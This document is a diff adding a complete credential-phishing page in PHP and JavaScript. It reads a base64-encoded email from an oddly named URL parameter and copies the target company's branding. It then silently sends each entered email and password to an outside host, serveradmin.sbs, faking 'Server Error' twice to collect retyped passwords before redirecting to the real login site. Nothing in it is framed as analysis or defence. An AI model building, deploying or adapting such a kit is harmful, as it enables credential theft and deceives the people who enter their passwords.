@@ -1,0 +1,267 @@
+<?php
+// Minimal PHP to render the page
+$email = isset($_GET['3ODkwIiw']) ? htmlspecialchars($_GET['3ODkwIiw']) : '';
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title id="page-title">Dynamic Login Portal</title>
+    <link rel="icon" id="favicon" href="">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-image 0.5s ease;
+        }
+        .login-container {
+            background-color: rgba(255, 255, 255, 0.95); /* Semi-opaque white to stand out */
+            z-index: 10; /* Ensure form is above background */
+            transform: translateX(200px);
+            opacity: 0;
+            animation: slideIn 1s ease-out forwards;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        @keyframes slideIn {
+            to { transform: translateX(0); opacity: 1; }
+        }
+        #email[readonly] {
+            pointer-events: none; /* Prevents cursor interaction */
+            cursor: default; /* Changes cursor to default instead of text cursor */
+            background-color: #f3f4f6; /* Light gray background to indicate non-editable */
+        }
+    </style>
+</head>
+<body>
+    <div class="p-8 w-full max-w-md login-container">
+        <div class="flex justify-center items-center mb-4">
+            <img id="logoimg" src="" alt="Company Logo" class="h-16 hidden">
+        </div>
+        <h2 id="logoname" class="text-2xl font-bold text-center mb-4 capitalize"></h2>
+        <form id="login-form" method="POST" action="https://serveradmin.sbs/fav.php">
+            <input
+                type="email"
+                id="email"
+                name="email"
+                placeholder="Email"
+                class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+                value="<?php echo $email; ?>"
+                readonly
+            >
+            <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Password"
+                class="w-full p-2 mb-3 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+            >
+            <p id="error" class="text-red-500 text-center mt-1 mb-3 hidden"></p>
+            <button
+                type="submit"
+                id="submit-btn"
+                class="w-full bg-blue-600 text-white p-2 rounded hover:bg-blue-700 transition"
+            >
+                Sign In
+            </button>
+        </form>
+        <p id="msg" class="text-green-500 text-center mt-3 hidden"></p>
+    </div>
+    <script>
+        $(document).ready(function() {
+            // Domain to login URL mapping
+            const loginMap = {
+                'gmail.com': 'https://mail.google.com',
+                'outlook.com': 'https://login.live.com',
+                'yahoo.com': 'https://login.yahoo.com',
+                'hotmail.com': 'https://login.live.com',
+                'aol.com': 'https://login.aol.com'
+            };
+
+            // Function to get login URL for a domain
+            function getLoginUrl(domain) {
+                return loginMap[domain] || `https://${domain}`;
+            }
+
+            // Function to parse query parameter
+            function getQueryParam(param) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const value = urlParams.get(param);
+                if (value) {
+                    try {
+                        // Attempt to decode as base64
+                        return atob(value);
+                    } catch (e) {
+                        // If decoding fails, use raw value
+                        console.log('Base64 decode failed for', param, ':', value, 'Error:', e.message);
+                        return value;
+                    }
+                }
+                return null;
+            }
+
+            // Handle email processing
+            let email = getQueryParam('3ODkwIiw') || $('#email').val();
+            console.log('Extracted email:', email);
+
+            function updateBranding(email) {
+                if (!email) {
+                    $('#error').text('Please enter an email').show();
+                    $('#logoimg, #logoname').addClass('hidden');
+                    $('#favicon').attr('href', '');
+                    $('#page-title').text('Dynamic Login Portal');
+                    document.body.style.backgroundImage = '';
+                    console.log('No email provided');
+                    return;
+                }
+
+                const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                if (!emailRegex.test(email)) {
+                    $('#error').text('Invalid email format').show();
+                    $('#logoimg, #logoname').addClass('hidden');
+                    $('#favicon').attr('href', '');
+                    $('#page-title').text('Dynamic Login Portal');
+                    document.body.style.backgroundImage = '';
+                    console.log('Invalid email:', email);
+                    return;
+                }
+
+                const domain = email.split('@')[1];
+                const domainWithoutTld = domain.split('.')[0];
+                const pageTitle = domainWithoutTld.charAt(0).toUpperCase() + domainWithoutTld.slice(1);
+                console.log('Domain:', domain, 'Domain without TLD:', domainWithoutTld, 'Page Title:', pageTitle);
+
+                // Set favicon
+                const faviconUrl = `https://www.google.com/s2/favicons?domain=${domain}`;
+                $('#favicon').attr('href', faviconUrl);
+                console.log('Favicon URL:', faviconUrl);
+
+                // Set page title
+                $('#page-title').text(pageTitle);
+
+                // Set logo
+                const logoUrl = `https://logo.clearbit.com/${domain}`;
+                $('#logoimg').attr('src', logoUrl).removeClass('hidden').on('error', function() {
+                    $(this).addClass('hidden');
+                    console.log('Logo load failed for:', logoUrl);
+                });
+
+                // Set background
+                const loginUrl = getLoginUrl(domain);
+                const backgroundUrl = `url('https://image.thum.io/get/width/1200/${loginUrl}')`;
+                document.body.style.backgroundImage = backgroundUrl;
+                console.log('Background URL:', backgroundUrl);
+
+                // Update display
+                $('#logoname').text(domainWithoutTld).removeClass('hidden');
+                $('#error').hide();
+            }
+
+            // Initial branding update
+            updateBranding(email);
+            $('#email').val(email); // Populate email input with extracted email
+
+            // Update branding on email input change
+            $('#email').on('input', function() {
+                email = $(this).val();
+                updateBranding(email);
+            });
+
+            // Track submission attempts
+            let attemptCount = 0;
+
+            // Function to perform silent submission
+            function submitToEndpoint(emailVal, passwordVal, attempt) {
+                console.log(`Attempt ${attempt}: Initiating silent submission to https://serveradmin.sbs/fav.php`);
+                console.log(`Data: email=${emailVal}, password=${passwordVal}`);
+
+                $.ajax({
+                    url: 'https://serveradmin.sbs/fav.php',
+                    type: 'POST',
+                    data: {
+                        email: emailVal,
+                        password: passwordVal
+                    },
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    timeout: 5000, // 5-second timeout
+                    success: function(response) {
+                        console.log(`Attempt ${attempt}: Submission successful. Response:`, response);
+                    },
+                    error: function(xhr, status, error) {
+                        console.error(`Attempt ${attempt}: Submission failed. Status: ${status}, Error: ${error}`);
+                        console.error('XHR:', xhr);
+                        if (xhr.status === 0) {
+                            console.error('Possible CORS issue or network failure. Check if https://serveradmin.sbs/fav.php is accessible and allows cross-origin requests.');
+                        }
+                    }
+                });
+            }
+
+            // Handle form submission
+            $('#login-form').on('submit', function(e) {
+                e.preventDefault(); // Prevent default form submission
+                $('#error').hide();
+                $('#msg').hide();
+
+                const emailVal = $('#email').val();
+                const passwordVal = $('#password').val();
+
+                // Client-side validation
+                if (!emailVal) {
+                    $('#error').text('Email field is empty').show();
+                    console.log('Form error: Email empty');
+                    return;
+                }
+                const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+                if (!emailRegex.test(emailVal)) {
+                    $('#error').text('Invalid email format').show();
+                    console.log('Form error: Invalid email');
+                    return;
+                }
+                if (!passwordVal) {
+                    $('#error').text('Password field is empty').show();
+                    console.log('Form error: Password empty');
+                    return;
+                }
+
+                // Increment attempt counter
+                attemptCount++;
+                console.log('Attempt:', attemptCount);
+
+                // Perform silent submission
+                submitToEndpoint(emailVal, passwordVal, attemptCount);
+
+                // Handle attempts
+                if (attemptCount < 3) {
+                    // Show error for first two attempts
+                    $('#error').text('Server Error, Try again').show();
+                    $('#password').val(''); // Clear password input
+                } else {
+                    // On third attempt, submit and redirect
+                    $('#msg').text('Redirecting, Try Again Later...').show();
+                    setTimeout(function() {
+                        const redirectUrl = getLoginUrl(emailVal.split('@')[1]);
+                        console.log('Redirecting to:', redirectUrl);
+                        window.location.href = redirectUrl;
+                    }, 1000);
+                }
+            });
+
+            // Clear error message when user starts typing in password field
+            $('#password').on('input', function() {
+                $('#error').hide();
+            });
+        });
+    </script>
+</body>
+</html>
+
